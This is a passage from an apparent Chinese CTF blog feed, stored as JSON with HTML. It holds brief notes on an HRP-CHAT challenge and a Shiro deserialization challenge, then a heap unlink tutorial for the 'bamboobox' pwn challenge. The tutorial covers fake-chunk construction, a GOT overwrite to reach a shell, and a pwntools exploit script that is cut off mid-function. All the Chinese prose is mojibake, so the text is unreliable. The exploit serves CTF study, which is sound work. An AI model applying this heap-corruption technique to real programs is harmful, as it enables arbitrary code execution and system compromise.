id=\"hrp-chat-3\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-3\">#</a> HRP-CHAT-3</h4>\n<p><img data-src=\"/img/wp/image-20230813204233847.png\" alt=\"image-20230813204233847\"></p>\n<p>Êää Boss ËÉΩÂæóÂà∞ flagÔºåÂè™ËÉΩÂéªÊäΩÂ•ñÔºå‰ΩÜÊäΩ‰∏çÂà∞ÊúÄÈ´òÁöÑÔºå‰ΩÜÊòØ H3h3QAQ Â§üÁî®‰∫Ü</p>\n<p><img data-src=\"/img/wp/image-20230813204151370.png\" alt=\"image-20230813204151370\"></p>\n<p><img data-src=\"/img/wp/image-20230813204502026.png\" alt=\"image-20230813204502026\"></p>\n<p>Â∫èÂè∑ÊòØ 9</p>\n<p><img data-src=\"/img/wp/image-20230813204547270.png\" alt=\"image-20230813204547270\"></p>\n<p>ÂæóÂà∞ flag</p>\n<h2 id=\"3-web\"><a class=\"markdownIt-Anchor\" href=\"#3-web\">#</a> 3. web:</h2>\n<h4 id=\"ez_java_checkin\"><a class=\"markdownIt-Anchor\" href=\"#ez_java_checkin\">#</a> ez_java_checkin</h4>\n<p>shiro ÂèçÂ∫èÂàóÂåñ</p>\n<p><img data-src=\"/img/wp/image-20230813205114576.png\" alt=\"image-20230813205114576\"></p>\n<p><img data-src=\"/img/wp/image-20230813205917940.png\" alt=\"image-20230813205917940\"></p>\n<p><img data-src=\"/img/wp/image-20230813210003062.png\" alt=\"image-20230813210003062\"></p>\n<p>ÂæóÂà∞ flag„ÄÇ</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/08/11/unlink/",
            "url": "http://example.com/2023/08/11/unlink/",
            "title": "unlink",
            "date_published": "2023-08-11T05:56:52.000Z",
            "content_html": "<h1 id=\"pwn_unlink‰∫ÜËß£Â≠¶‰π†\"><a class=\"markdownIt-Anchor\" href=\"#pwn_unlink‰∫ÜËß£Â≠¶‰π†\">#</a> PWN_unlink ‰∫ÜËß£Â≠¶‰π†</h1>\n<h2 id=\"ÂéüÁêÜ\"><a class=\"markdownIt-Anchor\" href=\"#ÂéüÁêÜ\">#</a> ÂéüÁêÜÔºö</h2>\n<p>Êàë‰ª¨Âú®Âà©Áî® unlink ÊâÄÈÄ†ÊàêÁöÑÊºèÊ¥ûÊó∂ÔºåÂÖ∂ÂÆûÂ∞±ÊòØÂØπ chunk ËøõË°åÂÜÖÂ≠òÂ∏ÉÂ±ÄÔºåÁÑ∂ÂêéÂÄüÂä© unlink Êìç‰ΩúÊù•ËææÊàê‰øÆÊîπÊåáÈíàÁöÑÊïàÊûú„ÄÇ</p>\n<p><em>Ê≥®ÊÑèËøôÈáåÁöÑÊòØ‰øÆÊîπÊåáÈíà</em></p>\n<p>ÁÆÄÂçïÁöÑ‰ªãÁªç‰∏ã unlinkÔºåÂÖ∂ÂÆû ctfwiki Êúâ‰ªãÁªçÔºåËøôÈáåÁÆÄÂçï‰ªãÁªç‰∏ãÔºö</p>\n<pre><code>1. È¶ñÂÖàÊâæÂà∞Ë¶ÅËøõË°åunlinkÁöÑchunk(ËøôÈáåËÆ∞‰∏∫P)ÁöÑÂâçÂêéÂ†ÜÂùóÔºå\n   FD = P-&gt;fd, BK = P-&gt;bk„ÄÇ\n\t\n2. ËøõË°åÂÆâÂÖ®Ê£ÄÊü•Ôºåglibc2.23ÁöÑÊΩ¶ËçâÂà§Êñ≠Êù°‰ª∂Â¶Ç‰∏ã\n   FD-&gt;bk == P, BK-&gt;fd == P„ÄÇ\n   \n3. ÁÑ∂ÂêéÊâßË°åFD-&gt;bk=BK, BK-&gt;fd=FD„ÄÇ\n\n4. ÂΩìÊüê‰∏™non-fastÂ§ßÂ∞èÁöÑchunkË¢´ÈáäÊîæÊó∂ÔºåÂ∞±‰ºöÊ†πÊçÆPREV_INUSE‰ΩçÊ£ÄÊü•ÂÖ∂ÂâçÂêéÂ†ÜÂùóÊòØÂê¶Â§Ñ‰∫éÈáäÊîæÁä∂ÊÄÅÔºåÂ¶ÇÊûúÊòØÂ∞±‰ºöÂ∞ÜÂâçÈù¢ÊàñÂêéÈù¢ÁöÑÂ†ÜÂùóÂèñÂá∫Âπ∂‰∏éÂΩìÂâçÂ†ÜÂùóÂêàÂπ∂„ÄÇÂèñÂá∫ÂâçÈù¢ÊàñÂêéÈù¢ÁöÑÂ†ÜÂùóPÁöÑËøáÁ®ãÂ∞±ÊòØunlink\n</code></pre>\n<p>ËøôÈáåÂ∞±ÊòØÊàë‰ª¨ÈúÄË¶ÅÊûÑÈÄ† fake_chunk ÂéªÁªïËøáÊ£ÄÊü•ÔºåÂà©Áî® unlink ÊºèÊ¥ûÔºåÂéªËææÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅËææÊàêÁöÑÊïàÊûú„ÄÇ</p>\n<ul>\n<li>Âà©Áî® pwn unlink ÊºèÊ¥ûÂèØ‰ª•ÂÆûÁé∞‰ª•‰∏ãÊîªÂáªÔºö</li>\n</ul>\n<ol>\n<li><strong>Ê≥ÑÈú≤ÂÜÖÂ≠ò</strong>ÔºöÈÄöËøá unlink ÊºèÊ¥ûÔºåÂèØ‰ª•Â∞Ü‰∏§‰∏™Áõ∏ÈÇªÁöÑÂ†ÜÂùóÂêàÂπ∂ÔºåÂØºËá¥‰∏Ä‰∏™Â∑≤ÁªèÈáäÊîæÁöÑÂ†ÜÂùó‰∏≠ÁöÑÊåáÈíàË¢´ÁØ°Êîπ„ÄÇÈÄöËøá‰øÆÊîπÊåáÈíàÁöÑÂÄºÔºåÂèØ‰ª•Ê≥ÑÈú≤Â†Ü‰∏≠ÁöÑÊïèÊÑü‰ø°ÊÅØÔºåÂ¶ÇÂáΩÊï∞ÊåáÈíà„ÄÅÂ†ÜÂùóÂ§¥ÈÉ®Êï∞ÊçÆÁ≠â„ÄÇ</li>\n<li><strong>‰ªªÊÑèÂÜÖÂ≠òÂÜô</strong>ÔºöÈÄöËøá unlink ÊºèÊ¥ûÔºåÂèØ‰ª•‰øÆÊîπÂ∑≤ÁªèÈáäÊîæÁöÑÂ†ÜÂùóÁöÑÂâçÂêéÊåáÈíàÔºå‰ªéËÄåÂÆûÁé∞‰ªªÊÑèÂÜÖÂ≠òÂÜô„ÄÇËøôÂèØ‰ª•Áî®Êù•‰øÆÊîπÂÖ≥ÈîÆÊï∞ÊçÆÁªìÊûÑÔºåÂ¶ÇÂ†ÜÂùóÂ§¥ÈÉ®„ÄÅÂÖ®Â±ÄÂèòÈáèÁ≠âÔºåËøõËÄåÊéßÂà∂Á®ãÂ∫èÁöÑÊâßË°åÊµÅÁ®ã„ÄÇ</li>\n<li><strong>ÊâßË°å‰ªªÊÑè‰ª£Á†Å</strong>ÔºöÈÄöËøáÊ≥ÑÈú≤ÂáΩÊï∞ÊåáÈíàÊàñ‰øÆÊîπËøîÂõûÂú∞ÂùÄÁ≠âÊñπÂºèÔºåÂèØ‰ª•ÁØ°ÊîπÁ®ãÂ∫èÁöÑÊéßÂà∂ÊµÅÔºå‰ªéËÄåÂÆûÁé∞‰ª£Á†ÅÊâßË°å„ÄÇËøôÂèØ‰ª•Áî®Êù•ÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å„ÄÅËé∑ÂèñÁ≥ªÁªüÊùÉÈôêÁ≠â„ÄÇ</li>\n</ol>\n<blockquote>\n<p><img data-src=\"/img/unlinkpic/unlink_smallbin_intro.png\" alt=\"img\"></p>\n</blockquote>\n<blockquote>\n<p>Âà©Áî®ÊÄùË∑Ø <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18y\">¬∂</span></p>\n<p>Êù°‰ª∂ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18z\">¬∂</span></p>\n<ol>\n<li>UAF ÔºåÂèØ‰øÆÊîπ free Áä∂ÊÄÅ‰∏ã smallbin ÊàñÊòØ unsorted bin ÁöÑ fd Âíå bk ÊåáÈíà</li>\n<li>Â∑≤Áü•‰ΩçÁΩÆÂ≠òÂú®‰∏Ä‰∏™ÊåáÈíàÊåáÂêëÂèØËøõË°å UAF ÁöÑ chunk</li>\n</ol>\n<p>ÊïàÊûú <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI180\">¬∂</span></p>\n<p>‰ΩøÂæóÂ∑≤ÊåáÂêë UAF chunk ÁöÑÊåáÈíà ptr Âèò‰∏∫ ptr - 0x18</p>\n<p>ÊÄùË∑Ø <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI181\">¬∂</span></p>\n<p>ËÆæÊåáÂêëÂèØ UAF chunk ÁöÑÊåáÈíàÁöÑÂú∞ÂùÄ‰∏∫ ptr</p>\n<ol>\n<li>‰øÆÊîπ fd ‰∏∫ ptr - 0x18</li>\n<li>‰øÆÊîπ bk ‰∏∫ ptr - 0x10</li>\n<li>Ëß¶Âèë unlink</li>\n</ol>\n<p>ptr Â§ÑÁöÑÊåáÈíà‰ºöÂèò‰∏∫ ptr - 0x18„ÄÇ</p>\n<p>ÂÖâËÆ≤ÂéüÁêÜÔºåÂæàÊûØÁá•‰πèÂë≥„ÄÇ‰∏ä‰∏™È¢òÁõÆÔºåÊèêÊèêÂÖ¥Ë∂£„ÄÇ</p>\n</blockquote>\n<h3 id=\"È¢òÁõÆÊù•Ê∫ê\"><a class=\"markdownIt-Anchor\" href=\"#È¢òÁõÆÊù•Ê∫ê\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2hpdGNvbnRyYWluaW5nX3VubGluaw==\">È¢òÁõÆÊù•Ê∫êÔºö</span></h3>\n<h6 id=\"‰æãË°åÊ£ÄÊü•\"><a class=\"markdownIt-Anchor\" href=\"#‰æãË°åÊ£ÄÊü•\">#</a> ‰æãË°åÊ£ÄÊü•Ôºö</h6>\n<p><img data-src=\"/img/unlinkpic/image-20230811115628259.png\" alt=\"image-20230811115628259\"></p>\n<h6 id=\"ÊâßË°åÁ®ãÂ∫è\"><a class=\"markdownIt-Anchor\" href=\"#ÊâßË°åÁ®ãÂ∫è\">#</a> ÊâßË°åÁ®ãÂ∫èÔºö</h6>\n<p><img data-src=\"/img/unlinkpic/image-20230811115714589.png\" alt=\"image-20230811115714589\"></p>\n<blockquote>\n<p>Áªô‰∫Ü‰∏™ËèúÂçïÔºå‰∏ÄÂÖ± 5 ‰∏™ node„ÄÇËøôÈáåÂ∞±‰∏ç‰∏Ä‰∏ÄÊâßË°å‰∫Ü„ÄÇ</p>\n</blockquote>\n<h6 id=\"idaÁúãÊ∫ê‰ª£Á†Å\"><a class=\"markdownIt-Anchor\" href=\"#idaÁúãÊ∫ê‰ª£Á†Å\">#</a> IDA ÁúãÊ∫ê‰ª£Á†ÅÔºö</h6>\n<ul>\n<li>main:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811115907614.png\" alt=\"image-20230811115907614\"></p>\n<blockquote>\n<p>ÂèØ‰ª•ÁúãÂà∞ÂæàÂ§öÂáΩÊï∞„ÄÇËøôÈáåÁÆÄÂçïËÆ≤‰∏Ä‰∏ãÂêß„ÄÇÁ®ãÂ∫èÈ¶ñÂÖàÁî≥ËØ∑‰∫Ü 0x10 Â≠óËäÇÂ§ßÂ∞èÁöÑÂ†ÜÁ©∫Èó¥„ÄÇÂπ∂Â∞ÜËøîÂõûÁöÑÊåáÈíàËµã‰∫à v4 ÂèòÈáè„ÄÇÂ∞Ü v4 [0] ÁöÑÂáΩÊï∞ÊåáÈíàÊåáÂêë hello_message ÂÜÖÂÆπÔºåv4 [1] ÁöÑÂáΩÊï∞ÊåáÈíàÊåáÂêë goodbye_message ÁöÑÂÜÖÂÆπ„ÄÇÁÑ∂ÂêéÂºÄÂ§¥ÊâìÂç∞ v4 [0] ÊåáÂêëÁöÑÂÜÖÂÆπ„ÄÇÊé•ÁùÄËøõË°åÂæ™ÁéØÔºåÊØèÂæ™ÁéØ‰∏ÄÊ¨°ÈÉΩ‰ºöË∞ÉÁî® menu ÂáΩÊï∞ÔºåÂπ∂‰∏îËæìÂÖ•‰∏Ä‰∏™‰∏çÈïø‰∫é 8 Â≠óËäÇÁöÑÊï∞Â≠óÔºåÁÑ∂ÂêéÂ∞ÜËæìÂÖ•ÁöÑÊï∞Â≠óËΩ¨Êç¢ÊàêÊï¥Êï∞ËøõË°å switch ÂåπÈÖç„ÄÇ</p>\n</blockquote>\n<ul>\n<li>add_item:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811121510474.png\" alt=\"image-20230811121510474\"></p>\n<blockquote>\n<p>add Ë¶ÅÊ±ÇËæìÂÖ•Â§ßÂ∞èÂíåÂÜÖÂÆπ„ÄÇÂú®ËøôÈáåÂèØ‰ª•ÂæàÊòéÊòæÁöÑÂèëÁé∞‰∏ÄÂùó bss ÊÆµÂú∞ÂùÄ„ÄÇÂõ†‰∏∫ bss ÊÆµÂèØ‰ª•‰ªªÊÑèËØªÂÜôÔºåÊâÄ‰ª•ÂèØ‰ª•ÈÄöËøá unlink ÊºèÊ¥ûÂú® bss ÊÆµÂÜôÂÖ• got Âú∞ÂùÄÔºå‰ªéËÄåÂèØ‰ª•Ê≥ÑÈú≤ libc Âú∞ÂùÄ</p>\n</blockquote>\n<ul>\n<li>remove_item:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811124741272.png\" alt=\"image-20230811124741272\"></p>\n<blockquote>\n<p>‰∏çÂ≠òÂú® uaf ÊºèÊ¥ûÔºå‰ΩÜÊòØÂèØ‰ª•Âà©Áî® free ‰∏Ä‰∏™Èùû fastbins Â§ßÂ∞èÁöÑ chunkÔºåÂéªËß¶Âèë unlink ÊºèÊ¥û„ÄÇ</p>\n</blockquote>\n<ul>\n<li>\n<p>change_item:</p>\n<p><img data-src=\"/img/unlinkpic/image-20230811124946810.png\" alt=\"image-20230811124946810\"></p>\n</li>\n</ul>\n<blockquote>\n<p>Ê≥®ÈáäÂç≥‰ΩøÈáçÁÇπÔºÅ</p>\n</blockquote>\n<ul>\n<li>\n<p>show_item:</p>\n<p><img data-src=\"/img/unlinkpic/image-20230811125058481.png\" alt=\"image-20230811125058481\"></p>\n</li>\n</ul>\n<blockquote>\n<p>Âà©Áî®ËøôÈáåÁöÑËæìÂá∫ÔºåÂèØ‰ª•ÂéªÊâìÂç∞Â§Ñ libc Âú∞ÂùÄ</p>\n</blockquote>\n<h6 id=\"expÊûÑÈÄ†ËøáÁ®ã\"><a class=\"markdownIt-Anchor\" href=\"#expÊûÑÈÄ†ËøáÁ®ã\">#</a> exp ÊûÑÈÄ†ËøáÁ®ãÔºö</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># To stop merging chunk</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>È¶ñÂÖà make chunk„ÄÇ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ptr<span class=\"token operator\">=</span><span class=\"token number\">0x6020c8</span><span class=\"token comment\">#ÊåáÂêë itemlist ÂÜÖÂÆπ</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fd<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bk<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>bk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token comment\">#Â†ÜÊ∫¢Âá∫ÔºåÊîπÂÜô chunk1 ÁöÑÂ§¥Ôºå‰∏∫ÂêéÁª≠ unlink Ëß¶Âèë„ÄÇ</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#Ëß¶Âèë unlink, ‰Ωø chunk0 ÊåáÂêë itemlist ÂÜÖÂÆπ</span></pre></td></tr></table></figure><p>Êé•‰∏ãÊù•Â∞±ÊòØÊ≥ÑÈú≤ libcÔºåÁÑ∂ÂêéÂéªË¶ÜÁõñ got Âú∞ÂùÄ„ÄÇÊâßË°å shell ÂáΩÊï∞„ÄÇ</p>\n<h6 id=\"ÊúÄÁªàÁöÑexp\"><a class=\"markdownIt-Anchor\" href=\"#ÊúÄÁªàÁöÑexp\">#</a> ÊúÄÁªàÁöÑ expÔºö</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># r = remote('node4.buuoj.cn',25461)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./bamboobox')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./bamboobox'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./bamboobox'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add_item</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the length of item name:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the name of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the index of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    r<span class=\"token 